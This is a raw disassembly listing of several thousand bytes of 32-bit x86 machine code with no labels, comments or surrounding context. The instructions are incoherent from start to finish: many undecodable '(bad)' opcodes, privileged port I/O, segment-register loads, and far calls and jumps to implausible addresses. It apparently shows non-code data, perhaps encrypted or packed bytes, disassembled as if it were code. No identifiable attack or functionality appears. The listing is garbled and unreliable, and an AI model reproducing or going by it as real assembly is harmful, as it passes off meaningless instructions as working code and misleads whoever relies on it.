  412d04:	lock lahf 
  412d06:	das    
  412d07:	jbe    0x412d4d
  412d09:	imul   ebx,DWORD PTR [eax+0xa0d5017],0x27
  412d10:	xchg   esi,eax
  412d11:	(bad)  
  412d12:	sar    BYTE PTR [edi],cl
  412d14:	lods   eax,DWORD PTR ds:[esi]
  412d15:	pop    ss
  412d16:	fisttp QWORD PTR [edi+0x34]
  412d19:	(bad)  [ecx+0x268d50a0]
  412d1f:	push   edi
  412d20:	cmc    
  412d21:	es data16 jl 0x412d89
  412d25:	push   edx
  412d26:	in     al,dx
  412d27:	(bad)  
  412d28:	xor    BYTE PTR [edi],cl
  412d2a:	addr16 into 
  412d2c:	mov    bl,0xf1
  412d2e:	test   DWORD PTR [eax+0x32],ebx
  412d31:	pop    ds
  412d32:	mov    ds:0xadec953,eax
  412d37:	pop    edi
  412d38:	jno    0x412cdb
  412d3a:	sub    al,0x7f
  412d3c:	js     0x412d31
  412d3e:	sub    esp,DWORD PTR [edi+0x3b]
  412d41:	sub    al,0xde
  412d43:	shl    edx,1
  412d45:	mov    al,ds:0xa7c2cb31
  412d4a:	mov    bl,0x51
  412d4c:	(bad)  
  412d4d:	sub    eax,0x2493ede9
  412d52:	push   edi
  412d53:	adc    eax,0x309c767
  412d58:	xchg   edi,eax
  412d59:	pop    ss
  412d5a:	inc    eax
  412d5b:	aaa    
  412d5c:	push   es
  412d5d:	icebp  
  412d5e:	sbb    BYTE PTR [edx-0x4c9aa93c],bh
  412d64:	pop    ecx
  412d65:	mov    eax,ds:0x495fe98
  412d6a:	jb     0x412cf2
  412d6c:	push   cs
  412d6d:	mov    bh,BYTE PTR [eax-0x3535a914]
  412d73:	mov    ah,0xb
  412d75:	dec    ebx
  412d76:	inc    esp
  412d77:	add    DWORD PTR [esi],eax
  412d79:	aam    0x1c
  412d7b:	jbe    0x412d32
  412d7d:	xchg   esp,eax
  412d7e:	xlat   BYTE PTR ds:[ebx]
  412d7f:	fs in  al,dx
  412d81:	xchg   esp,eax
  412d82:	shr    DWORD PTR [edi+ebx*4-0x18],cl
  412d86:	ret    0x17b
  412d89:	jns    0x412d59
  412d8b:	add    eax,0x272e6a0a
  412d90:	mul    BYTE PTR [ebp+0x5abfdb0]
  412d96:	dec    ebx
  412d97:	mov    edi,0x63b765b7
  412d9c:	cmp    BYTE PTR [ebx-0x5b],0xff
  412da0:	pop    esi
  412da1:	(bad)  
  412da2:	and    ebp,DWORD PTR [ecx-0x445507fd]
  412da8:	jmp    0x412d31
  412daa:	call   0xf7bd6c5f
  412daf:	xchg   esp,eax
  412db0:	test   DWORD PTR [edx-0x7aea1055],edi
  412db6:	dec    ebp
  412db7:	pop    esp
  412db8:	(bad)  
  412db9:	xchg   ebx,eax
  412dba:	add    ebp,DWORD PTR [ecx+edi*4]
  412dbd:	das    
  412dbe:	jl     0x412dd1
  412dc0:	test   BYTE PTR [ebx+0x46],0x9b
  412dc4:	mov    eax,ds:0xb7155785
  412dc9:	(bad)  
  412dcb:	sbb    al,0xec
  412dcd:	sub    bh,bl
  412dcf:	not    esi
  412dd1:	lea    edi,[eax-0x604a2309]
  412dd7:	in     al,0x65
  412dd9:	ss or  edi,edx
  412ddc:	mov    ds:0xcf9fa1b6,al
  412de1:	sahf   
  412de2:	mov    eax,ds:0x773433d0
  412de7:	cs jne 0x412dfc
  412dea:	mov    al,0x13
  412dec:	adc    al,0x67
  412dee:	enter  0x13e3,0x75
  412df2:	aam    0xb3
  412df4:	mov    esp,0xd341bc3c
  412df9:	scas   eax,DWORD PTR es:[edi]
  412dfa:	mov    edx,0xfadb0ecf
  412dff:	sbb    ch,BYTE PTR [ecx+0x184d6611]
  412e05:	jle    0x412e49
  412e07:	sbb    ah,BYTE PTR [edi+0x21438e6a]
  412e0d:	(bad)
  412e11:	push   DWORD PTR [ebx+0x1116bf9f]
  412e17:	pop    ebx
  412e18:	pop    ds
  412e19:	inc    esp
  412e1a:	jae    0x412dd1
  412e1c:	in     al,0x17
  412e1e:	add    eax,0xf9a9ded8
  412e23:	enter  0x6301,0xe
  412e27:	add    DWORD PTR [ebx+ecx*2],ebp
  412e2a:	mov    dl,0x28
  412e2c:	mov    dl,0xff
  412e2e:	sbb    ch,BYTE PTR [ebp-0x24]
  412e31:	cmp    al,0x14
  412e33:	dec    eax
  412e34:	je     0x412e88
  412e36:	in     eax,dx
  412e37:	rcl    bl,cl
  412e39:	hlt    
  412e3a:	jmp    0x412e20
  412e3c:	mov    ah,0xcb
  412e3e:	inc    edx
  412e3f:	por    mm1,mm5
  412e42:	lea    eax,[ebp+0x6f]
  412e45:	pusha  
  412e46:	jae    0x412eb1
  412e48:	push   0x5749fcb2
  412e4d:	adc    BYTE PTR [ebx+0x29d0cde5],al
  412e53:	repz les esi,FWORD PTR [ecx-0x23]
  412e57:	add    eax,0xd641448a
  412e5c:	push   ds
  412e5d:	mov    ebx,0x15a445c5
  412e62:	leave  
  412e63:	inc    edx
  412e64:	mov    edi,0x2970472b
  412e69:	ret    0x3351
  412e6c:	sub    eax,0x5d0c846c
  412e71:	cwde   
  412e72:	(bad)  [edx-0x55646599]
  412e78:	fbld   TBYTE PTR [edx+edx*4]
  412e7b:	mov    cs,WORD PTR [ebx+0x33]
  412e7e:	scas   al,BYTE PTR es:[edi]
  412e7f:	push   ss
  412e80:	inc    ebx
  412e81:	lgs    edi,FWORD PTR ds:0xcead2196
  412e88:	jne    0x412e69
  412e8a:	ins    DWORD PTR es:[edi],dx
  412e8b:	dec    ebx
  412e8c:	std    
  412e8d:	jle    0x412e6c
  412e8f:	test   al,cl
  412e91:	in     eax,dx
  412e92:	jae    0x412e5f
  412e94:	bound  edi,QWORD PTR [esi-0x63]
  412e97:	xor    eax,0xf46ca8cb
  412e9c:	lods   al,BYTE PTR ds:[esi]
  412e9d:	xor    BYTE PTR [eax+0x41],0xeb
  412ea1:	push   edx
  412ea2:	xchg   cl,ah
  412ea4:	fidiv  DWORD PTR [edx]
  412ea6:	mov    eax,ds:0x183c0af9
  412eab:	add    al,0x40
  412ead:	hlt    
  412eae:	ficom  DWORD PTR [ebx+0x45]
  412eb1:	pop    esi
  412eb2:	cmp    edi,DWORD PTR ds:0x3a2a8e37
  412eb8:	push   0x1ec476ef
  412ebd:	(bad)  
  412ebe:	sbb    bl,BYTE PTR [ebp+esi*8+0x45]
  412ec2:	and    BYTE PTR [edx-0x12a645e1],al
  412ec8:	js     0x412f31
  412eca:	mov    esp,0x59d84a02
  412ecf:	add    dh,BYTE PTR [ecx-0x1d]
  412ed2:	fld    TBYTE PTR [ebx+ebx*8-0x17]
  412ed6:	push   ecx
  412ed7:	xchg   ecx,eax
  412ed8:	retf   
  412ed9:	lds    edi,FWORD PTR [ebx+0x593a6367]
  412edf:	adc    cl,BYTE PTR [esi]
  412ee1:	fucom  st(5)
  412ee3:	and    edx,DWORD PTR [esi+0x1fb652e4]
  412ee9:	dec    esi
  412eea:	shl    DWORD PTR [edx],cl
  412eec:	sbb    DWORD PTR [esi+0x7b2f1896],esp
  412ef2:	call   FWORD PTR [edx+0x589ada8b]
  412ef8:	lds    esp,FWORD PTR [esi+0x65]
  412efb:	adc    al,0xd9
  412efd:	frstor [ecx-0x4381048f]
  412f03:	mov    bh,0x8d
  412f05:	sbb    al,0x99
  412f07:	in     al,dx
  412f08:	xchg   esi,eax
  412f09:	mov    edi,0x346b4afc
  412f0e:	xchg   ebp,eax
  412f0f:	aaa    
  412f10:	cmp    al,0xd
  412f12:	jg     0x412f75
  412f14:	or     DWORD PTR [edx],esi
  412f16:	test   al,0x74
  412f18:	or     esp,DWORD PTR [eax-0x75761dc0]
  412f1e:	pop    eax
  412f1f:	or     dl,BYTE PTR [ebx]
  412f21:	lods   eax,DWORD PTR ds:[esi]
  412f22:	xor    esp,esp
  412f24:	sti    
  412f25:	nop
  412f26:	xchg   ecx,eax
  412f27:	shl    BYTE PTR [ecx],cl
  412f29:	fnstcw WORD PTR [ecx+edi*8-0x22aecdd6]
  412f30:	pop    esp
  412f31:	push   0xffffffda
  412f33:	pop    ecx
  412f34:	les    ebx,FWORD PTR [esi+0x65]
  412f37:	fwait
  412f38:	repz ror BYTE PTR [esi],1
  412f3b:	test   ah,0x10
  412f3e:	sbb    bl,BYTE PTR [ecx]
  412f40:	xchg   bh,dl
  412f42:	test   al,0x2e
  412f44:	out    0x5a,eax
  412f46:	(bad)  
  412f47:	out    dx,eax
  412f48:	in     al,0x26
  412f4a:	inc    edi
  412f4b:	mov    edi,0xeac4302e
  412f50:	dec    ecx
  412f51:	mov    cl,0x96
  412f53:	shr    DWORD PTR [esi],1
  412f55:	in     eax,dx
  412f56:	jmp    0xb2e46cd9
  412f5b:	je     0x412f03
  412f5d:	scas   eax,DWORD PTR es:[edi]
  412f5e:	jns    0x412fc5
  412f60:	pop    edi
  412f61:	pop    ebp
  412f62:	push   eax
  412f63:	imul   ecx,esi,0xbf0fca7a
  412f69:	jmp    0x412fcb
  412f6b:	sub    al,0x13
  412f6d:	(bad)  [ecx+edi*4]
  412f70:	cmp    ch,BYTE PTR [ebx]
  412f72:	inc    ecx
  412f73:	(bad)  
  412f74:	and    DWORD PTR [ebp+0x6c],esp
  412f77:	fs jo  0x412f54
  412f7a:	aas    
  412f7b:	adc    dl,BYTE PTR [edx-0x23]
  412f7e:	dec    esi
  412f7f:	inc    eax
  412f80:	lods   eax,DWORD PTR ds:[esi]
  412f81:	push   ds
  412f82:	jp     0x412f7b
  412f84:	(bad)  
  412f86:	pop    eax
  412f87:	pop    edi
  412f88:	pop    ebp
  412f89:	and    DWORD PTR [ebx+0x1f],edx
  412f8c:	rcl    DWORD PTR [ecx],1
  412f8e:	mov    ch,BYTE PTR [edx+0x52eb52a5]
  412f94:	test   DWORD PTR [edi-0x5e],0x2910cbe8
  412f9b:	sbb    al,0xaa
  412f9d:	and    al,0xa1
  412f9f:	xor    eax,0x25f5a57e
  412fa4:	lds    esp,FWORD PTR [esi]
  412fa6:	loopne 0x412fcf
  412fa8:	pop    ds
  412fa9:	rol    bl,1
  412fab:	iret   
  412fac:	inc    ecx
  412fad:	sub    DWORD PTR [esi+0x6a],0xac81136c
  412fb4:	inc    ecx
  412fb5:	mov    eax,DWORD PTR cs:[edi]
  412fb8:	push   eax
  412fb9:	pop    ds
  412fba:	cmc    
  412fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fbc:	imul   eax,DWORD PTR [edx],0x65249d18
  412fc2:	xchg   ebp,eax
  412fc3:	add    DWORD PTR [edi-0x5296ab1d],esp
  412fc9:	add    eax,0x60cb974a
  412fce:	or     ebx,DWORD PTR [esp+ebp*4-0xf9b10f4]
  412fd5:	lods   al,BYTE PTR ds:[esi]
  412fd6:	mov    dl,0x8e
  412fd8:	mov    edi,0x28e84d72
  412fdd:	sbb    DWORD PTR [eax+0x412bdd53],eax
  412fe3:	xchg   edx,eax
  412fe4:	mov    edx,0x4dc13c20
  412fe9:	xchg   edx,eax
  412fea:	outs   dx,BYTE PTR ds:[esi]
  412feb:	cli    
  412fec:	jmp    0xb4a4764c
  412ff1:	or     eax,0x4212d73
  412ff6:	pop    edx
  412ff7:	lods   al,BYTE PTR ds:[esi]
  412ff8:	in     al,dx
  412ff9:	js     0x412f7c
  412ffb:	bound  ebx,QWORD PTR [edx]
  412ffd:	xor    ebp,DWORD PTR [esi+0x7d]
  413000:	sub    dl,BYTE PTR ds:0x9308f271
  413006:	popf   
  413007:	pusha  
  413008:	std    
  413009:	stos   DWORD PTR es:[edi],eax
  41300a:	les    ebx,FWORD PTR [ecx-0x3f5b6b84]
  413010:	push   esp
  413011:	sub    al,0x53
  413013:	sar    DWORD PTR [esi+0x5c],cl
  413016:	es (bad) 
  413018:	in     al,dx
  413019:	into   
  41301a:	xchg   edx,eax
  41301b:	daa    
  41301c:	mov    WORD PTR [eax+esi*8-0x4c8e5116],ds
  413023:	mov    DWORD PTR [edi+0x58228923],ecx
  413029:	out    dx,al
  41302a:	sti    
  41302b:	jg     0x412fcc
  41302d:	shl    DWORD PTR [ebx-0x2e497873],1
  413033:	sub    dh,BYTE PTR [edi-0x13b60a13]
  413039:	jecxz  0x412fc2
  41303b:	add    eax,0x594b8eb4
  413040:	inc    esp
  413041:	ds dec edx
  413043:	(bad)  
  413044:	push   eax
  413045:	daa    
  413046:	cmp    eax,0xde02add4
  41304b:	xor    BYTE PTR [esi-0x30c78b93],bl
  413051:	jmp    0xc5f6bd4b
  413056:	pop    ebx
  413057:	dec    ebp
  413058:	pop    ebx
  413059:	mov    al,ds:0x27d1ec37
  41305e:	jae    0x412ff8
  413060:	xchg   edi,eax
  413061:	ins    DWORD PTR es:[edi],dx
  413062:	mov    bl,0x38
  413064:	bound  ebp,QWORD PTR [esi-0x60ec378d]
  41306a:	jno    0x4130cf
  41306c:	in     eax,dx
  41306d:	jmp    0x413016
  41306f:	push   esp
  413070:	je     0x413094
  413072:	push   esi
  413073:	(bad)  
  413074:	jne    0x4130e0
  413076:	ja     0x41308c
  413078:	enter  0xf4c7,0xbc
  41307c:	fistp  DWORD PTR [ebp-0x2c]
  41307f:	mov    fs,WORD PTR [edi]
  413081:	in     eax,0x6a
  413083:	jmp    0xc689:0x1f51a49e
  41308a:	test   eax,0xe4be2c72
  41308f:	push   edx
  413090:	int    0xac
  413092:	mov    al,ds:0x8d9eee84
  413097:	mov    ebx,0x91479869
  41309c:	jle    0x4130e1
  41309e:	out    0x97,al
  4130a0:	imul   ecx,DWORD PTR [ebx-0x22b165f3],0x10d640a2
  4130aa:	mov    eax,ds:0x5c3e5a06
  4130af:	push   esp
  4130b0:	xor    eax,0xc8135325
  4130b5:	mov    al,0x2b
  4130b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b8:	push   eax
  4130b9:	pop    ds
  4130ba:	sub    eax,0x8b1303e8
  4130bf:	pop    ss
  4130c0:	push   ebx
  4130c1:	in     al,dx
  4130c2:	(bad)  
  4130c3:	ins    BYTE PTR es:[edi],dx
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	push   esp
  4130c6:	jecxz  0x4130a1
  4130c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130c9:	xchg   BYTE PTR [ebx+edi*8-0x33],bh
  4130cd:	daa    
  4130ce:	mov    dh,0xb6
  4130d0:	daa    
  4130d1:	es dec edx
  4130d3:	scas   ax,WORD PTR es:[edi]
  4130d5:	ins    BYTE PTR es:[edi],dx
  4130d6:	test   al,0x29
  4130d8:	sub    BYTE PTR ds:0xe3fe1f1b,cl
  4130de:	js     0x413142
  4130e0:	jbe    0x4130ff
  4130e2:	and    al,0xbb
  4130e4:	push   es
  4130e5:	inc    eax
  4130e6:	gs pop ss
  4130e8:	hlt    
  4130e9:	mov    eax,ds:0xd554ea96
  4130ee:	push   0xd4efc33
  4130f3:	sub    esi,DWORD PTR [ecx-0x73]
  4130f6:	sub    BYTE PTR [eax],0xc
  4130f9:	leave  
  4130fa:	push   esi
  4130fb:	dec    edx
  4130fc:	ss retf 
  4130fe:	xor    dl,BYTE PTR ds:0x57fb392e
  413104:	test   eax,0x269b8757
  413109:	pushf  
  41310a:	mov    bl,0x6b
  41310c:	push   0x23
  41310e:	icebp  
  41310f:	scas   al,BYTE PTR es:[edi]
  413110:	push   esp
  413111:	push   0xd069e028
  413116:	inc    esi
  413117:	ins    DWORD PTR es:[edi],dx
  413118:	jo     0x41314b
  41311a:	fld    QWORD PTR [edi-0x5fa7a664]
  413120:	sub    edx,DWORD PTR ds:0xe5bb5092
  413126:	fstp   TBYTE PTR [eax-0x5575919f]
  41312c:	cmp    al,0x78
  41312e:	int3   
  41312f:	jne    0x4130cc
  413131:	leave  
  413132:	add    dh,bh
  413134:	sub    eax,ebx
  413136:	inc    edx
  413137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413138:	xor    eax,0x2cd6bb4c
  41313d:	sbb    ch,cl
  41313f:	(bad)  [edi+0x36aa25ba]
  413145:	add    esp,ebx
  413147:	mov    cs,edi
  413149:	mov    ah,0xce
  41314b:	cmp    eax,0xf9c97b6a
  413150:	imul   esp,DWORD PTR [ebp-0x7b],0xffffffcc
  413154:	ret    0xa50b
  413157:	jp     0x41314f
  413159:	fsub   QWORD PTR [eax-0x74375790]
  41315f:	mov    ebp,0xb3edc15a
  413164:	out    0x39,eax
  413166:	lock jmp 0x413178
  413169:	jecxz  0x41316f
  41316b:	xor    ebx,ecx
  41316d:	js     0x413108
  41316f:	rcr    DWORD PTR [ebx+0x786b92c6],cl
  413175:	xor    esi,DWORD PTR [ecx+0x33e6ac2d]
  41317b:	adc    DWORD PTR [ebx+0x3b6de3df],ebp
  413181:	nop
  413182:	cmp    BYTE PTR [edx],ah
  413184:	sar    DWORD PTR [ecx+eiz*2-0x27d8e5ce],cl
  41318b:	mov    ch,0xa9
  41318d:	cmp    eax,0xaa89f64f
  413192:	push   0x38657c45
  413197:	(bad)  
  413198:	mov    edi,0x602be323
  41319d:	or     edx,esi
  41319f:	mov    ah,0x87
  4131a1:	sub    dl,BYTE PTR [esi+0x279f9caf]
  4131a7:	mov    ah,0xc9
  4131a9:	mov    ch,0xb9
  4131ab:	test   eax,0xe390d6cb
  4131b0:	jne    0x4131d7
  4131b2:	or     eax,0x7f1b67a4
  4131b7:	push   ss
  4131b8:	add    ch,bh
  4131ba:	or     eax,0xb36895e2
  4131bf:	jbe    0x4131c1
  4131c1:	sub    ebx,DWORD PTR [edx]
  4131c3:	imul   eax,DWORD PTR [ecx+0x8],0x23
  4131c7:	outs   dx,DWORD PTR cs:[esi]
  4131c9:	xchg   esp,eax
  4131ca:	push   ecx
  4131cb:	lahf   
  4131cc:	loopne 0x413212
  4131ce:	adc    eax,0xb4b4d95d
  4131d3:	gs jle 0x413239
  4131d6:	clc    
  4131d7:	fiadd  WORD PTR [ebx]
  4131d9:	loopne 0x413172
  4131db:	dec    esi
  4131dc:	sub    eax,0xb5fd6cb2
  4131e1:	adc    cl,BYTE PTR [esi]
  4131e3:	xor    al,BYTE PTR [ecx+0x72]
  4131e6:	int    0x64
  4131e8:	push   0x49b81e09
  4131ed:	mov    esi,0x96efa99d
  4131f2:	loop   0x41320e
  4131f4:	jnp    0x41325a
  4131f6:	loopne 0x413252
  4131f8:	jge    0x413181
  4131fa:	sub    al,BYTE PTR [edi]
  4131fc:	call   0xb0e9:0xf0088f51
  413203:	sub    BYTE PTR [esi-0x7cbb79c8],ah
  413209:	inc    esp
  41320a:	mov    edi,0x6065b978
  41320f:	mov    ds:0x2c1d4406,eax
  413214:	pop    ecx
  413215:	cdq    
  413216:	in     al,0xc0
  413218:	mov    ah,0x4
  41321a:	shl    DWORD PTR [ebx+esi*4],0xfb
  41321e:	data16 xor BYTE PTR [edi+0x2063e4bb],0x57
  413226:	mov    ds:0xa31eee12,eax
  41322b:	push   edx
  41322c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41322d:	push   edi
  41322e:	lea    esi,[esi+edi*4]
  413231:	clc    
  413232:	cmp    BYTE PTR [eax+edi*1-0x2c],cl
  413236:	imul   eax,DWORD PTR [eax+edx*1],0xc6807318
  41323d:	dec    ebp
  41323e:	mov    ds,WORD PTR [ecx-0x74]
  413241:	dec    edx
  413242:	pop    es
  413243:	(bad)  
  413244:	and    bh,BYTE PTR [edx+0x31d2fecc]
  41324a:	sbb    eax,0x6c95d85f
  41324f:	retf   0x11d7
  413252:	sar    BYTE PTR [eax],cl
  413254:	push   0x5c
  413256:	aaa    
  413257:	mov    ecx,0x31a081a6
  41325c:	or     edi,DWORD PTR [esi]
  41325e:	push   edi
  41325f:	jp     0x4132a3
  413261:	(bad)  
  413262:	xchg   ebx,eax
  413263:	lahf   
  413264:	cmp    al,0x83
  413266:	daa    
  413267:	sbb    esi,DWORD PTR [eax+0x1f]
  41326a:	call   0x824e6be3
  41326f:	test   BYTE PTR [eax],0xb8
  413272:	fsubr  QWORD PTR [esi+eiz*4]
  413275:	(bad)  
  413276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413278:	inc    ecx
  413279:	stc    
  41327a:	stos   DWORD PTR es:[edi],eax
  41327b:	or     dl,dh
  41327d:	or     DWORD PTR [eax-0x6541f7d3],eax
  413283:	push   edx
  413284:	retf   0xbcf1
  413287:	and    eax,0x63633183
  41328c:	pop    edi
  41328d:	xor    eax,edi
  41328f:	pop    esp
  413290:	leave  
  413291:	mov    ah,0xf6
  413293:	fild   QWORD PTR [ebx+ebx*1-0x4f]
  413297:	jp     0x413233
  413299:	pusha  
  41329a:	dec    esi
  41329b:	pop    edi
  41329c:	push   cs
  41329d:	test   eax,0xd8447c75
  4132a2:	xlat   BYTE PTR ds:[ebx]
  4132a3:	jle    0x4132ba
  4132a5:	jg     0x4132d6
  4132a7:	popa   
  4132a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132a9:	pop    ebp
  4132aa:	jle    0x41331d
  4132ac:	push   edx
  4132ad:	xor    DWORD PTR ds:0x1ff5000e,ecx
  4132b3:	and    bh,bl
  4132b5:	out    0xde,al
  4132b7:	gs ds xor eax,0x62e9bade
  4132be:	adc    ah,BYTE PTR [ebx]
  4132c0:	fldcw  WORD PTR [edi+ebp*8-0x58]
  4132c4:	jge    0x413255
  4132c6:	cmp    BYTE PTR [edx-0x27f7871f],bh
  4132cc:	and    DWORD PTR [eax-0x5c1559fb],esp
  4132d2:	popf   
  4132d3:	xchg   DWORD PTR [edx],ecx
  4132d5:	cmc    
  4132d6:	loop   0x41331f
  4132d8:	popf   
  4132d9:	leave  
  4132da:	jle    0x413320
  4132dc:	dec    esi
  4132dd:	add    dh,cl
  4132df:	ins    BYTE PTR es:[edi],dx
  4132e0:	je     0x4132bf
  4132e2:	shl    DWORD PTR [ecx],cl
  4132e4:	xchg   ebp,eax
  4132e5:	ficomp WORD PTR [edx]
  4132e7:	in     eax,0xbd
  4132e9:	icebp  
  4132ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132eb:	xor    BYTE PTR [eax],dl
  4132ed:	xchg   edx,eax
  4132ee:	data16 aaa 
  4132f0:	popa   
  4132f1:	nop
  4132f2:	inc    edi
  4132f3:	leave  
  4132f4:	fst    QWORD PTR [ecx-0x39accc79]
  4132fa:	inc    esp
  4132fb:	mov    ?,WORD PTR ds:0xa16ffcc
  413301:	mov    WORD PTR [ecx],?
  413303:	gs xchg ecx,eax
  413305:	dec    esp
  413306:	jmp    0x413288
  413308:	add    BYTE PTR [edx*1+0x1c9bd311],ah
  41330f:	jle    0x413360
  413311:	xchg   esp,eax
  413312:	or     bl,bh
  413314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413315:	pop    edi
  413316:	dec    eax
  413317:	stos   BYTE PTR es:[di],al
  413319:	cmp    eax,DWORD PTR [edx-0x21]
  41331c:	xchg   edi,eax
  41331d:	loop   0x4132c5
  41331f:	mov    dh,0xb9
  413321:	and    BYTE PTR [ecx-0x1c],dl
  413324:	jo     0x413390
  413326:	iret   
  413327:	lahf   
  413328:	and    DWORD PTR [edx],0x2
  41332b:	xlat   BYTE PTR ds:[ebx]
  41332c:	xchg   ebx,eax
  41332d:	xor    ah,BYTE PTR [ecx-0x7a]
  413330:	int    0xc5
  413332:	jle    0x413361
  413334:	out    0xcf,eax
  413336:	mov    esi,0x70403ebb
  41333b:	push   esi
  41333c:	and    eax,DWORD PTR [ebx]
  41333e:	jmp    0xaf8f:0xa9868ae8
  413345:	repz mov eax,ds:0x8d7819f7
  41334b:	mov    ebp,0xe1778f60
  413350:	fadd   st,st(0)
  413352:	repz add al,0x56
  413355:	jb     0x4133ae
  413357:	data16 icebp 
  413359:	sub    ch,BYTE PTR [eax]
  41335b:	pop    esi
  41335c:	xor    cl,dh
  41335e:	push   eax
  41335f:	ins    DWORD PTR es:[edi],dx
  413360:	xchg   DWORD PTR [eax+ecx*1-0x7],edx
  413364:	mov    bh,0x81
  413366:	add    al,0x8c
  413368:	mov    ebx,0xdb67dec1
  41336d:	in     al,dx
  41336e:	sbb    ecx,DWORD PTR [ecx-0x2a]
  413371:	dec    esi
  413372:	in     al,0x8
  413374:	loopne 0x41339a
  413376:	xor    BYTE PTR [ebp-0xf8ee9d9],cl
  41337c:	sbb    eax,DWORD PTR [bx+di+0x34]
  413380:	std    
  413381:	stc    
  413382:	jl     0x413349
  413384:	dec    eax
  413385:	add    eax,0xa7f3f4ce
  41338a:	sub    eax,0xdc19dc9a
  41338f:	cdq    
  413390:	sub    ecx,DWORD PTR [esi]
  413392:	std    
  413393:	call   0xa8df:0xa9ffa562
  41339a:	aas    
  41339b:	lea    ecx,[ebx-0x1f00a3fd]
  4133a1:	ror    DWORD PTR [edx-0x52],cl
  4133a4:	mov    edx,0xd407d2bf
  4133a9:	push   ecx
  4133aa:	dec    ebx
  4133ab:	jecxz  0x413333
  4133ad:	pop    ebx
  4133ae:	mov    ebp,0x6f886714
  4133b3:	and    dl,BYTE PTR [ecx-0x2d]
  4133b6:	pusha  
  4133b7:	in     eax,dx
  4133b8:	cs js  0x413403
  4133bb:	push   0xf1544fea
  4133c0:	inc    eax
  4133c1:	pop    edx
  4133c2:	add    DWORD PTR ds:0x37cb87fe,esi
  4133c8:	and    DWORD PTR [ebx+0x6616bb14],esi
  4133ce:	pop    edx
  4133cf:	cmp    eax,0xd95d0734
  4133d4:	xchg   ebp,eax
  4133d5:	inc    esi
  4133d6:	adc    DWORD PTR [ebx+0x44],ebp
  4133d9:	popf   
  4133da:	xor    esp,0xffffffde
  4133dd:	outs   dx,DWORD PTR ds:[esi]
  4133de:	inc    ebp
  4133df:	sbb    dl,BYTE PTR [ebp-0x3f76cf4f]
  4133e5:	inc    esi
  4133e6:	out    dx,al
  4133e7:	loope  0x41338b
  4133e9:	sar    DWORD PTR [ebp+0x7260c5e8],0x57
  4133f0:	imul   eax,eax,0xe
  4133f3:	mov    ds,ebx
  4133f5:	das    
  4133f6:	neg    bl
  4133f8:	ins    DWORD PTR es:[edi],dx
  4133f9:	dec    esp
  4133fa:	inc    edi
  4133fb:	fmul   DWORD PTR [ecx-0x5d]
  4133fe:	dec    edi
  4133ff:	mov    esp,0xc2a0cef4
  413404:	cmp    DWORD PTR [edx],0x68a91233
  41340a:	xchg   ecx,eax
  41340b:	pop    es
  41340c:	cmp    DWORD PTR [bp+si-0x23ce],ecx
  413411:	shr    DWORD PTR ds:0x4c5256fe,cl
  413417:	push   ebp
  413418:	push   0xffffffae
  41341a:	mov    DWORD PTR [ebx],edi
  41341c:	cmp    ah,BYTE PTR [ebx+ecx*8]
  41341f:	mov    al,ds:0x43abd135
  413424:	mov    ch,0xb3
  413426:	or     al,0x62
  413428:	and    ebx,DWORD PTR [ebx+0x7b]
  41342b:	jnp    0x41340d
  41342d:	adc    eax,0xfb86b017
  413432:	pop    esi
  413433:	fdivp  st(5),st
  413435:	lea    esp,[eax]
  413437:	out    0x37,al
  413439:	xchg   esp,eax
  41343a:	jne    0x4133e6
  41343c:	outs   dx,BYTE PTR ds:[esi]
  41343d:	adc    DWORD PTR [edx-0x24f761ab],0x7d
  413444:	pop    es
  413445:	sbb    BYTE PTR [ebx-0x73],bh
  413448:	int3   
  413449:	ds std 
  41344b:	or     ebp,DWORD PTR [ebp+0x4a]
  41344e:	push   0xded62ea0
  413453:	inc    edi
  413454:	adc    BYTE PTR [ecx],bl
  413456:	lahf   
  413457:	xchg   edx,eax
  413458:	and    eax,0xe22f592c
  41345d:	add    al,bl
  41345f:	ss mov cl,0x83
  413462:	xor    eax,0xcc8f4a85
  413467:	mov    ss,WORD PTR [ebx]
  413469:	ror    esi,1
  41346b:	fdiv   QWORD PTR cs:[edx+0x8]
  41346f:	adc    dl,BYTE PTR [edx-0x69cef81e]
  413475:	jb     0x413493
  413477:	aad    0x80
  413479:	call   0x4c65:0x6732acae
  413480:	test   eax,0x7c31887e
  413485:	pop    ecx
  413486:	imul   DWORD PTR [edx]
  413488:	stos   BYTE PTR es:[edi],al
  413489:	xchg   esi,eax
  41348a:	mov    cl,0xcc
  41348c:	jne    0x413432
  41348e:	lock sbb eax,0xe4214e40
  413494:	and    edx,edx
  413496:	pushf  
  413497:	popf   
  413498:	aam    0x38
  41349a:	push   cs
  41349b:	stc    
  41349c:	outs   dx,BYTE PTR ds:[esi]
  41349d:	imul   esp,DWORD PTR [esi-0x7354005e],0xffffffe3
  4134a4:	sub    edi,DWORD PTR [ebx-0x49]
  4134a7:	dec    eax
  4134a8:	popa   
  4134a9:	jmp    0x4134cc
  4134ab:	das    
  4134ac:	retf   
  4134ad:	aam    0x97
  4134af:	xor    BYTE PTR [edi+esi*1-0x3476c832],0x6a
  4134b7:	or     BYTE PTR [eax+0x379f7961],dh
  4134bd:	sti    
  4134be:	rcr    DWORD PTR [eax],cl
  4134c0:	mov    esp,0x46c75a8c
  4134c5:	add    esp,edx
  4134c7:	(bad)  
  4134c8:	test   al,0x21
  4134ca:	cwde   
  4134cb:	loopne 0x4134c7
  4134cd:	fyl2x  
  4134cf:	pusha  
  4134d0:	fist   DWORD PTR [esi]
  4134d2:	dec    ecx
  4134d3:	xchg   ebp,eax
  4134d4:	in     al,0xdb
  4134d6:	out    0x42,eax
  4134d8:	pop    edi
  4134d9:	adc    DWORD PTR [esi+0x56],eax
  4134dc:	in     al,0x20
  4134de:	sub    ch,bl
  4134e0:	adc    al,0x6b
  4134e2:	xchg   BYTE PTR [esi+esi*1+0x6ff67e70],bh
  4134e9:	pop    ecx
  4134ea:	sub    eax,0x362abb0c
  4134ef:	sbb    eax,DWORD PTR [edi+0x2f76933]
  4134f5:	jmp    0x413520
